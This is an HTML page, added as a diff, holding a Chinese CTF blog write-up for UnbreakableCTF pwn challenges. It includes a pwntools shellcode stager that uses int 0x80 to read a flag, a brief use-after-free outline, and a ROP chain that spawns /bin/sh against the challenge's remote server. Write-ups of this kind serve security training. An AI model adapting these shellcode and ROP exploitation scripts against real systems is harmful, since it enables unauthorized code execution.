@@ -1,0 +1,184 @@
+<!DOCTYPE html>
+<html id="_top" lang="zh-CN" data-theme="light"><head><script>(function () {
+        const storageKey = "theme";
+        const root = document.documentElement;
+        const supportsMatchMedia = typeof window.matchMedia === "function";
+        const mediaQuery = supportsMatchMedia
+            ? window.matchMedia("(prefers-color-scheme: dark)")
+            : null;
+
+        const readStorage = () => {
+            try {
+                return window.localStorage.getItem(storageKey);
+            } catch (error) {
+                return null;
+            }
+        };
+
+        const writeStorage = (value) => {
+            try {
+                window.localStorage.setItem(storageKey, value);
+            } catch (error) {
+                return;
+            }
+        };
+
+        const applyTheme = (value) => {
+            const theme = value === "dark" ? "dark" : "light";
+            root.setAttribute("data-theme", theme);
+            if (document.body) {
+                document.body.setAttribute("data-theme", theme);
+            } else {
+                document.addEventListener(
+                    "DOMContentLoaded",
+                    () => {
+                        if (document.body) {
+                            document.body.setAttribute("data-theme", theme);
+                        }
+                    },
+                    { once: true }
+                );
+            }
+            return theme;
+        };
+
+        const updateButton = (value) => {
+            const theme = value === "dark" ? "dark" : "light";
+            const button = document.querySelector("[data-theme-toggle]");
+            if (!button) {
+                return;
+            }
+            const label = button.querySelector("[data-theme-toggle-label]");
+            const isDark = theme === "dark";
+            button.setAttribute("aria-pressed", isDark ? "true" : "false");
+            button.setAttribute("title", isDark ? "切换为浅色主题" : "切换为深色主题");
+            if (label) {
+                label.textContent = isDark ? "深色" : "浅色";
+            }
+        };
+
+        const stored = readStorage();
+        const initial =
+            stored === "light" || stored === "dark"
+                ? stored
+                : mediaQuery && mediaQuery.matches
+                  ? "dark"
+                  : "light";
+
+        const appliedTheme = applyTheme(initial);
+        updateButton(appliedTheme);
+
+        window.__setTheme = (value) => {
+            const theme = applyTheme(value);
+            writeStorage(theme);
+            updateButton(theme);
+        };
+
+        window.__toggleTheme = () => {
+            const current =
+                root.getAttribute("data-theme") === "dark" ? "dark" : "light";
+            const next = current === "dark" ? "light" : "dark";
+            const theme = applyTheme(next);
+            writeStorage(theme);
+            updateButton(theme);
+        };
+
+        const syncButtonState = () => {
+            updateButton(root.getAttribute("data-theme"));
+        };
+
+        const attachToggle = () => {
+            const button = document.querySelector("[data-theme-toggle]");
+            if (!button || button.__themeToggleBound) {
+                return;
+            }
+            button.__themeToggleBound = true;
+            button.addEventListener("click", (event) => {
+                event.preventDefault();
+                if (typeof window.__toggleTheme === "function") {
+                    window.__toggleTheme();
+                }
+            });
+        };
+
+        if (document.readyState === "loading") {
+            document.addEventListener("DOMContentLoaded", () => {
+                syncButtonState();
+                attachToggle();
+            });
+        } else {
+            syncButtonState();
+            attachToggle();
+        }
+
+        const handleMediaChange = (event) => {
+            const storedTheme = readStorage();
+            if (storedTheme === "light" || storedTheme === "dark") {
+                updateButton(storedTheme);
+                return;
+            }
+            const next = event.matches ? "dark" : "light";
+            const theme = applyTheme(next);
+            updateButton(theme);
+        };
+
+        if (mediaQuery) {
+            if (typeof mediaQuery.addEventListener === "function") {
+                mediaQuery.addEventListener("change", handleMediaChange);
+            } else if (typeof mediaQuery.addListener === "function") {
+                mediaQuery.addListener(handleMediaChange);
+            }
+        }
+    })();
+    if ("serviceWorker" in navigator) {
+        window.addEventListener("load", () => {
+            navigator.serviceWorker.register("/sw.js").catch(() => {});
+        });
+    }</script><meta charset="UTF-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><meta name="color-scheme" content="light dark"/><meta name="language" content="zh-CN"/><title>UnbreakableCTF 2025 Writeup | 花盆</title><meta name="author" content="LittFlower"/><meta property="og:title" content="UnbreakableCTF 2025 Writeup | 花盆"/><meta property="og:site_name" content="花盆"/><meta property="og:locale" content="zh-CN"/><link rel="canonical" href="https://blog.littflower.top/writeups/UnbreakableCTF2025-Writeup/"/><link rel="alternate" type="application/rss+xml" title="花盆" href="/rss.xml"/><link rel="stylesheet" href="/fonts.css" type="text/css" preload/><link rel="stylesheet" href="/style.css" type="text/css" preload/></head><body><div class="top-bar fullwidth"><div class="top-bar-inner fullwidth"><div class="top-bar-group"><a href="/" aria-label="root" class="file-link"><img src="/icons/dir.png" alt/><span>/</span></a><a href=".." aria-label="parent" class="file-link"><img src="/icons/dir.png" alt/><span>..</span></a></div><div class="top-bar-group"><h3><a href="#_content"><code class="hash inline-code">#</code>内容</a></h3><h3><a href="#_top"><code class="hash inline-code">#</code>回到顶部</a></h3><button type="button" data-theme-toggle="true" aria-label="切换亮暗主题" aria-pressed="false" title="切换主题" class="theme-toggle"><code aria-hidden="true" class="hash inline-code">#</code>  <span data-theme-toggle-label="true" class="theme-toggle-label">浅色</span></button></div></div></div><div class="page-shell"><div class="page-files"><div class="file"><a href="./README.mdx" class="file-link"><img src="/icons/text.png" alt/><span>README.mdx</span></a><div class="file-meta"><span>4.06 KiB</span><span class="file-meta-date">2024-04-09 08:00</span></div></div></div><div class="page-main"><div id="_content" style="scroll-margin-top:48px;" class="page-article"><h1 id="unbreakable-ctf-2024-pwn-writeups" class="scroll-target"><a href="#unbreakable-ctf-2024-pwn-writeups"><code class="hash inline-code">#</code>Unbreakable CTF 2024 Pwn WriteUps</a></h1>
+<p>复现了 UnbreakableCTF 2024 的二进制方向，动手做了两道题，口胡了一道堆题，有一些感悟和反思放在这里。</p>
+<h2 id="harder_assembly" class="scroll-target"><a href="#harder_assembly"><code class="hash inline-code">#</code>harder_assembly</a></h2>
+<h3 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>思路</a></h3>
+<p>一道 x64 的shellcode 题，难点是禁止在 shellcode 里使用 syscall 以及shellcode 长度只有 15 字节。</p>
+<p>后者比较好解决，可以考虑直接调用 <code class="inline-code">read</code> 构造二次输入，这样二次输入的时候就没有长度限制了，构造 orw 即可。</p>
+<p>这里我遇到的知识盲区主要是禁用了 syscall，解决方法是使用 int 0x80（即继续使用 x32 API）</p>
+<p>翻了一下 stackoverflow，注意到这样一段话：</p>
+<blockquote>
+<p>When called from a 64-bit program it behaves the same way it would behave like if it has been called from a 32-bit program (using the 32-bit calling convention).</p>
+</blockquote>
+<blockquote>
+<p>This also means that the parameters for &quot;int 0x80&quot; will be passed in 32-bit registers and the upper 32 bits of the 64-bit registers are ignored.</p>
+</blockquote>
+<p>所以如果要在 x64 下使用 int0x80 构造 read 函数系统调用时，得注意遵守相应的 x32 API 使用规范。</p>
+<h3 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>脚本</a></h3>
+<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-python language-python"><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./harder</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">orw </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">'</span><span style="color:#A65E2B">\xb0\x03\xb9\x00</span><span style="color:#B56959">@@</span><span style="color:#A65E2B">\x00\xcd\x80</span><span style="color:#B56959">h</span><span style="color:#A65E2B">\x00</span><span style="color:#B56959">@@</span><span style="color:#A65E2B">\x00\xc3</span><span style="color:#B5695977">'</span><br><span style="color:#A0ADA0"># input()</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">send</span><span style="color:#2993a3">(</span><span style="color:#393A34">orw</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">orw </span><span style="color:#999999">=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#393A34">shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">open</span><span style="color:#1e754f">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">./flag</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">orw </span><span style="color:#999999">+=</span><span style="color:#393A34"> asm</span><span style="color:#2993a3">(</span><span style="color:#393A34">shellcraft</span><span style="color:#999999">.</span><span style="color:#393A34">sendfile</span><span style="color:#1e754f">(</span><span style="color:#2F798A">1</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">7f</span><span style="color:#1e754f">)</span><span style="color:#2993a3">)</span><br><span style="color:#998418">input</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">orw</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#B5695977">"""</span><br><span style="color:#B56959">In [1]: asm(</span><span style="color:#B5695977">"""</span><br><span style="color:#A65E2B">   ...</span><span style="color:#999999">:</span><span style="color:#393A34">     mov al</span><span style="color:#999999">,</span><span style="color:#2F798A"> 3</span><br><span style="color:#A65E2B">   ...</span><span style="color:#999999">:</span><span style="color:#393A34">     mov ecx</span><span style="color:#999999">,</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">404000</span><br><span style="color:#A65E2B">   ...</span><span style="color:#999999">:</span><span style="color:#998418">     int</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">80</span><br><span style="color:#A65E2B">   ...</span><span style="color:#999999">:</span><span style="color:#393A34">     push </span><span style="color:#AB5959">0x</span><span style="color:#2F798A">404000</span><br><span style="color:#A65E2B">   ...</span><span style="color:#999999">:</span><span style="color:#393A34">     ret</span><br><span style="color:#A65E2B">   ...</span><span style="color:#999999">:</span><span style="color:#B5695977">     """</span><span style="color:#B56959">)</span><br><span style="color:#B5695977">"""</span><br></code></pre></div>
+<p>构造的第一次 shellcode 贴在脚本下方了。</p>
+<h2 id="heeap" class="scroll-target"><a href="#heeap"><code class="hash inline-code">#</code>heeap</a></h2>
+<p>这题我没具体做，自己口胡了个大致思路（因为队友切太快了.jpg</p>
+<p>题目给了 backdoor 函数，用 UAF，先申请 &quot;description&quot;，然后把对应的 ctf 块位置的 print 函数地址改成 backdoor，free 掉之后申请给 ctf即可（因为观察到 ctf 块和 description 块的大小是一样的，只是 print 函数的相对位置不一样罢了）</p>
+<h2 id="not_allowed" class="scroll-target"><a href="#not_allowed"><code class="hash inline-code">#</code>not_allowed</a></h2>
+<h3 id class="scroll-target"><a href="#"><code class="hash inline-code">#</code>思路</a></h3>
+<p><img src="https://s2.loli.net/2024/04/08/VOkrH89C3upTK71.png" alt="image.png"/></p>
+<p>题目给了一个很明显的栈溢出漏洞，由于题目函数列表中没有 puts/printf 等输出函数，与其 syscall write 不如 syscall execve，问题在于 gadget 比较少，一开始只看到了 <code class="inline-code">pop_rdi_ret</code> 和 <code class="inline-code">syscall</code>，<code class="inline-code">pop_rsi_ret</code> 和 <code class="inline-code">pop_rdx_ret</code> 都看不到..</p>
+<p>不过这不代表凑不出来 gadgets 去 syscall <code class="inline-code">execve('/bin/sh', 0, 0)</code>，我们想一想要做的无非以下 4 件事情：</p>
+<ul>
+<li>给 rdi搞到sh</li>
+<li>rsi 为 NULL</li>
+<li>rdx 为 NULL</li>
+<li>rax 为 0x3b</li>
+</ul>
+<p>第一个很好做，题目给了 backdoor，可以拿到 /bin/sh 的内存位置；</p>
+<p>第二个不一定非要用 <code class="inline-code">pop_rdi_ret</code>，下面这个也行：</p>
+<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-text">0x0000000000401161 : sub rax, rax ; ret
+0x00000000004011c1 : xor rsi, rsi ; mov rsi, rax ; ret
+</code></pre></div>
+<p>同理，用下面这个可以做到第三个（rax 已经为0）：</p>
+<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-text">0x000000000040116e : imul edx ; shr rdx, 0x3f ; ret
+</code></pre></div>
+<p>至于最后一个，也有两种做法，法一是用下面这个：</p>
+<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-text">0x00000000004011ce : inc al ; ret
+</code></pre></div>
+<p>重复 0x3b 次即可修改 rax 为 0x3b。</p>
+<p>法二可以构造一个 read，读入 0x3b 个数据，利用 rax 储存函数返回值来给 rax 赋值，后者更短一些，不过我图省事直接按第一个打了。</p>
+<div class="code-snippet"><pre class="code-snippet__pre"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./pwn</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">debug</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">35.234.88.19</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 31170</span><span style="color:#2993a3">)</span><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#393A34">wish_addr </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">401175</span><br><span style="color:#393A34">binsh_addr </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">40407d</span><br><span style="color:#393A34">pop_rdi_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">401156</span><br><span style="color:#393A34">xor_rsi_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4011c1</span><br><span style="color:#393A34">sub_rax_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">401161</span><br><span style="color:#393A34">imul_edx_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">40116e</span><br><span style="color:#393A34">add_rax_ret </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4011ce</span><br><span style="color:#393A34">syscall </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4011cc</span><br><br><span style="color:#393A34">payload </span><span style="color:#999999">=</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">a</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 32</span><span style="color:#AB5959"> +</span><span style="color:#AB5959"> b</span><span style="color:#B5695977">"</span><span style="color:#B56959">b</span><span style="color:#B5695977">"</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 8</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> flat</span><span style="color:#2993a3">(</span><span style="color:#1e754f">[</span><span style="color:#393A34">wish_addr</span><span style="color:#999999">,</span><span style="color:#393A34"> pop_rdi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> binsh_addr</span><span style="color:#999999">,</span><span style="color:#393A34"> sub_rax_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> xor_rsi_ret</span><span style="color:#999999">,</span><span style="color:#393A34"> imul_edx_ret</span><span style="color:#1e754f">]</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">payload </span><span style="color:#999999">+=</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">add_rax_ret</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> *</span><span style="color:#2F798A"> 59</span><span style="color:#AB5959"> +</span><span style="color:#393A34"> p64</span><span style="color:#2993a3">(</span><span style="color:#393A34">syscall</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># input()</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">sendline</span><span style="color:#2993a3">(</span><span style="color:#393A34">payload</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io</span><span style="color:#999999">.</span><span style="color:#393A34">interactive</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre></div></div></div></div><footer class="footer"><div class="footer-row footer-links"><span class="footer-label">保持联系</span><a href="mailto:xzy1476569428@163.com" class="footer-link"><p><a href="mailto:xzy1476569428@163.com" title="mailto:xzy1476569428@163.com">xzy1476569428@163.com</a></p></a><span aria-hidden="true" class="footer-separator">·</span><a href="/rss.xml" class="footer-link">RSS</a><span aria-hidden="true" class="footer-separator">·</span><a href="https://github.com/LittFlower/my_blog" class="footer-link"><p>GitHub</p></a></div><div class="footer-row footer-meta"><span><p>本站基于
+<a href="https://github.com/unvariant/blog">unvariant/blog</a>
+改造，除特别说明外内容以 CC BY 4.0 协议共享。</p></span></div></footer></body></html>
